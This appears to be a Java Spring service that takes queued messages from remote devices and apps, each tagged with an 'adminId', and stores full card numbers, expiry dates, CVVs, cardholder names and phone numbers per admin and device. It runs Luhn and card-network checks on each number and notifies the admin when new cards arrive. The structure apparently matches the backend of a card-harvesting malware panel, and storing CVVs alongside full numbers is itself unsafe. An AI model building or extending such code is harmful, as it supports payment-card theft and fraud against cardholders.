package app.service.service;

import app.service.model.CardRecord;
import app.service.store.CardsStore;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.stereotype.Service;

import java.time.Instant;

@Service
public class CardsProcessor {

    private final CardsStore store;
    private final ObjectMapper mapper;
    private final AdminNotifier notifier;
    private static final Logger log = LoggerFactory.getLogger(CardsProcessor.class);

    public CardsProcessor(CardsStore store, ObjectMapper mapper, AdminNotifier notifier) {
        this.store = store;
        this.mapper = mapper;
        this.notifier = notifier;
    }

    @RabbitListener(queues = "${app.queue}")
    public void onMessage(String body) {
        try {
            JsonNode root = mapper.readTree(body);
            String adminId = getText(root, "data.adminId");
            String deviceId = getText(root, "sender.deviceId");
            String appId = getText(root, "sender.appId");
            if (appId == null || appId.isBlank()) appId = "unknown";
            if (deviceId == null || deviceId.isBlank()) deviceId = "unknown";
            long collectedAtMs = parseInstant(root.at("/data/payload/collectedAt"));

            JsonNode cards = root.at("/data/payload/cards");
            int processed = 0;
            java.util.List<CardRecord> snapshot = new java.util.ArrayList<>();
            if (cards != null && cards.isArray()) {
                for (JsonNode it : cards) {
                    String panRaw = asString(it.get("card_number_raw"));
                    int month = asInt(it.get("expiry_month"));
                    int year = asInt(it.get("expiry_year"));
                    String cvv = asString(it.get("cvv"));
                    long eventTs = parseInstant(it.get("eventTimestamp"));
                    String nameOnCard = asString(it.get("name_on_card"));
                    String phoneNumber = asString(it.get("phone_number"));

                    String pan = normalizePan(panRaw);
                    String bin = pan.length() >= 6 ? pan.substring(0, 6) : "";
                    String last4 = pan.length() >= 4 ? pan.substring(pan.length() - 4) : pan;
                    boolean luhn = luhnCheck(pan);
                    String network = detectNetwork(pan);

            CardRecord card = CardRecord.builder()
                .adminId(adminId)
                .deviceId(deviceId)
                .appId(appId)
                            .pan(emptyToNull(pan))
                            .bin(emptyToNull(bin))
                            .last4(emptyToNull(last4))
                            .expiryMonth(month)
                            .expiryYear(year)
                            .luhnValid(luhn)
                            .network(emptyToNull(network))
                            .productType(null)
                            .issuer(null)
                            .country(null)
                            .cvv(emptyToNull(cvv))
                .nameOnCard(emptyToNull(nameOnCard))
                .phoneNumber(emptyToNull(phoneNumber))
                            .collectedAtMs(collectedAtMs)
                            .eventTimestampMs(eventTs)
                            .build();
                    snapshot.add(card);
                    processed++;
                }
            }
            // Replace snapshot in one write
            store.replaceAll(appId, adminId, deviceId, snapshot);
            log.info("cards: processed={} adminId={} deviceId={} appId={} collectedAt={}", processed, adminId, deviceId, appId, collectedAtMs);
            if (processed > 0) notifier.notifyRefresh(adminId, "refresh.cards");
        } catch (Exception e) {
            // ignore malformed messages; could add metrics/logging if needed
            log.warn("cards: failed to process message: {}", e.toString());
        }
    }

    private String getText(JsonNode root, String path) {
        String[] parts = path.split("\\.");
        JsonNode cur = root;
        for (String p : parts) cur = cur.path(p);
        return cur.isMissingNode() ? null : cur.asText();
    }

    private String asString(JsonNode n) {
        if (n == null || n.isNull()) return null;
        if (n.isTextual()) return n.asText();
        return n.asText();
    }

    private int asInt(JsonNode n) { return (n == null || n.isNull()) ? 0 : n.asInt(); }

    private long parseInstant(JsonNode n) {
        try { return Instant.parse(n.asText()).toEpochMilli(); } catch (Exception e) { return Instant.now().toEpochMilli(); }
    }

    private String normalizePan(String panRaw) {
        if (panRaw == null) return "";
    return panRaw.replaceAll("\\s+", "");
    }

    // Luhn checksum
    static boolean luhnCheck(String pan) {
        if (pan == null || pan.isBlank()) return false;
    int sum = 0;
    boolean alt = false;
        for (int i = pan.length() - 1; i >= 0; i--) {
            char ch = pan.charAt(i);
            if (ch < '0' || ch > '9') return false;
            int n = ch - '0';
            if (alt) { n *= 2; if (n > 9) n -= 9; }
            sum += n; alt = !alt;
        }
        return sum % 10 == 0;
    }

    static String detectNetwork(String pan) {
        if (pan == null || pan.isBlank()) { return null; }
        if (pan.startsWith("4")) { return "VISA"; }
        int p2 = pan.length() >= 2 ? safeInt(pan.substring(0, 2)) : -1;
        int p4 = pan.length() >= 4 ? safeInt(pan.substring(0, 4)) : -1;
        if ((p2 >= 51 && p2 <= 55) || (p4 >= 2221 && p4 <= 2720)) { return "MASTERCARD"; }
        if (p2 == 34 || p2 == 37) { return "AMEX"; }
        int p3 = p3(pan);
        if (pan.startsWith("6011") || pan.startsWith("65") || (p3 >= 644 && p3 <= 649)) { return "DISCOVER"; }
        return null;
    }

    private static int safeInt(String s) { try { return Integer.parseInt(s); } catch (Exception e) { return -1; } }

    private static int p3(String pan) {
        try { return Integer.parseInt(pan.substring(0, 3)); } catch (Exception e) { return -1; }
    }

    private static String emptyToNull(String s) { return (s == null || s.isBlank()) ? null : s; }
}
